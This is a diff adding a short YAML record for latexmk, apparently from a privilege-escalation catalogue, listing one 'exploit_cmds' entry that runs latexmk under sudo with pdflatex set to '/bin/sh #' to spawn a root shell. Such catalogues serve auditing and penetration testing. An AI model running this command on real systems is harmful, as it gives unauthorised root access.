@@ -1,0 +1,4 @@
+name: latexmk
+binary_path: /usr/bin/latexmk
+exploit_cmds:
+- 'sudo /usr/bin/latexmk -pdf -pdflatex=''/bin/sh #'' /dev/null'
